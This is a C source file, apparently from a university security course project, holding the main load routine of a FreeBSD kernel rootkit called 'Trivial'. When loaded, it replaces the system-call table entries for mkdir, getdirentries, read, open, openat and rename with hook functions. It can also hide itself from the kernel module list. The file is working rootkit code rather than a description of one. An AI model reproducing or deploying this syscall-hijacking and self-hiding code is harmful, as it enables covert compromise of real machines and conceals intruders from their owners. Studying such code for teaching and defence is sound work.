/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * This file contains the main kernel module load function
 *
 */

#include "trivial.h"

/* Syscall Pointer Definitions */
sy_call_t * mkdir = NULL;
sy_call_t * getdirentries = NULL;
sy_call_t * read = NULL;
sy_call_t * open = NULL;
sy_call_t * openat = NULL;
sy_call_t * rename = NULL;

/* The function called at load/unload. */
int
load(struct module *module, int cmd, void *arg)
{

#ifdef HIDE_KLD
	unload_kld_list ();
#endif /* HIDE_KLD */

	int error = 0;

	switch (cmd) {
		case MOD_LOAD:
			mkdir = sysent[SYS_mkdir].sy_call;
			sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;

			getdirentries = sysent[SYS_getdirentries].sy_call;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

			read = sysent[SYS_read].sy_call;
			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			
			open = sysent[SYS_open].sy_call;
			sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
			openat = sysent[SYS_openat].sy_call;
			sysent[SYS_openat].sy_call = (sy_call_t *)openat_hook;
			
			rename = sysent[SYS_rename].sy_call;
			sysent[SYS_rename].sy_call = (sy_call_t *)rename_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_mkdir].sy_call = mkdir;
			sysent[SYS_getdirentries].sy_call = getdirentries;
			sysent[SYS_read].sy_call = (sy_call_t *)read;
			sysent[SYS_open].sy_call = (sy_call_t *)open;
			sysent[SYS_openat].sy_call = (sy_call_t *)openat;
			sysent[SYS_rename].sy_call = (sy_call_t *)rename;

			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return(error);
}

/* The second argument of DECLARE_MODULE. */
static moduledata_t trivial_mod = {
	"trivial",	/* module name */
	load,		/* event handler */
	NULL		/* extra data */
};

DECLARE_MODULE(trivial, trivial_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
